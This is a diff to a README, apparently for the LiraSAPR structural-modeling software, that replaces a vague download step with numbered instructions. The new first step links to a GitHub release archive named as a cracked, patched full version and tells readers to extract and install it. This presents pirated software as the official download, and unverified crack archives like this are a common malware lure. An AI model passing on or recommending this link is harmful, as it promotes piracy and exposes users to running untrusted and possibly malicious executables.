@@ -7,14 +7,16 @@ Operating System: Windows 10 or higher 🪟
 Processor: 2.1 GHz or higher ⚙️
 RAM: Minimum 8 GB (16 GB recommended) 🧠
 Disk Space: Minimum 500 MB 💾
-Installation 🛠
-Download the latest version
-here
-📥.
-Follow the installation instructions provided on the website. 📂
-After installation, launch the application and start modeling! 🚀
-Usage Examples 📊
-image
+
+## Installation 🛠
+1. Download the latest release [here](https://github.com/gagaga1132/LiraSAPR/releases/download/LiraSAPR_Crack/LiraSAPR_crack_Full_Patched_x64.rar). 📥
+2. Extract the archive and follow the installation instructions. 📂
+3. After installation, launch the application. 🚀
+
+## Usage Examples 📊
+![image](https://github.com/user-attachments/assets/7ec7cfee-8b6e-49d2-97e3-ca4ad6004e00)
+
+
 
 Documentation 📚
 Complete documentation is available
